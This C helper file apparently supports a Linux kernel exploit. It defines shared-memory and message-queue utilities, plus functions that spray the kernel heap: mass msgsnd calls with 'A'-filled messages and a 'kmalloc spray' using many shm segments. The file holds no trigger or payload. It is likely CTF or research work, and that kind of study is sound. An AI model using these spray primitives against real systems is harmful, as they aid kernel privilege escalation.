#include "util.h"
#include <sys/shm.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <semaphore.h>

// general utils
sem_t* make_semaphore(int initial){
    int shm = shmget(IPC_PRIVATE, sizeof(sem_t), IPC_CREAT | 0666);
    sem_t *semaphore = shmat(shm, NULL, 0);
    sem_init(semaphore, 1, initial);
    return semaphore;
}
unsigned long* make_shared_long(){
    int shm = shmget(IPC_PRIVATE, sizeof(unsigned long), IPC_CREAT | 0666);
    return shmat(shm, NULL, 0);
}

// file utils
char* read_file(char* path, int size){
    char *buf = malloc(size);
    int fd = open(path, O_RDONLY);
    read(fd, buf, size);
    close(fd);
    return buf;
}

void write_file(char* path, char* buf, int size){
    int fd = open(path, O_RDWR|O_CREAT);
    write(fd, buf, size);
    close(fd);
    return;
}

// msg utils

int make_queue(){
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

msg* make_message(int size){
    msg* message = (msg*)malloc(size + 0x100);
    message->mtype = 1;
    memset(message->mtext, 0x41, size);
    return message;
}

void send_messages(int size, int num){
    int ret;
    msg* message = make_message(size);
    for (int i = 0; i < num; i++){
        ret = msgsnd(make_queue(), message, size - 0x30, IPC_NOWAIT);
        if (ret == -1) {
            perror("msgsnd");
            exit(-1);
        }
    }
}

// kmalloc spray
void spray_kmalloc32(int num){
    int shmid;
    char *shmaddr;
    for (int i = 0; i < num; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void*)-1) 
        {
            perror("shmat error");
            exit(-1);
        }
    }
}